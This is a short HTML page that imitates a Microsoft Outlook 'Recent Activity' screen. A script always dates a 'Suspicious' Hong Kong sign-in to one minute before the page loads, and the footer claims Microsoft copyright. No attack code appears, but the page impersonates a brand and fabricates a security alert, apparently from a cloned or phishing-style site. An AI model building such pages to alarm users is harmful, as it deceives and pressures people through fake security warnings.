<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Recent Activity - Outlook</title>
    <style>
        body {
            background: #f3f6fb;
            font-family: Segoe UI, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 520px;
            margin: 60px auto;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            padding: 32px 28px;
        }
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 18px;
        }
        .header img {
            width: 38px;
            margin-right: 12px;
        }
        .header h2 {
            color: #0078d4;
            font-size: 1.3em;
            margin: 0;
        }
        .desc {
            margin-bottom: 18px;
            color: #333;
            font-size: 1em;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 18px;
        }
        th, td {
            padding: 10px 8px;
            text-align: left;
            border-bottom: 1px solid #eaeaea;
            font-size: 0.98em;
        }
        th {
            background: #f3f2f1;
            color: #444;
        }
        .status {
            font-weight: bold;
            color: #d83b01;
        }
        .actions {
            text-align: right;
        }
        .btn {
            background: #0078d4;
            color: #fff;
            border: none;
            padding: 10px 22px;
            border-radius: 4px;
            font-size: 1em;
            cursor: pointer;
            margin-left: 8px;
        }
        .btn.secondary {
            background: #e1e1e1;
            color: #333;
        }
        .footer {
            margin-top: 24px;
            font-size: 0.92em;
            color: #888;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>Recent Activity</h2>
        </div>
        <div class="desc">
            Here are your recent sign-in activities. If you see any unfamiliar activity, please secure your account.
        </div>
        <table>
            <tr>
                <th>Date & Time</th>
                <th>Location</th>
                <th>Device</th>
                <th>Status</th>
            </tr>
            <tr>
                <td id="activity-now"></td>
                <td>Hong Kong</td>
                <td>Windows PC (Chrome)</td>
                <td class="status">Suspicious</td>
            </tr>
        </table>
        <div class="actions">
            <button class="btn" onclick="window.location.href='https://account.microsoft.com/security'">Secure Account</button>
            <button class="btn secondary" onclick="window.location.href='index.html'">Back</button>
            <button class="btn secondary" onclick="window.location.href='logout.html'">Log out</button>
        </div>
        <div class="footer">
            &copy; 2025 Microsoft Corporation. All rights reserved.
        </div>
    </div>
    <script>
            function formatDate(date) {
                const options = {
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    hour12: true
                };
                return date.toLocaleString('en-US', options);
            }

            // Set the activity time to 1 minute earlier than now
            const now = new Date();
            now.setMinutes(now.getMinutes() - 1);
            document.getElementById('activity-now').textContent = formatDate(now);
        </script>
</body>
</html>
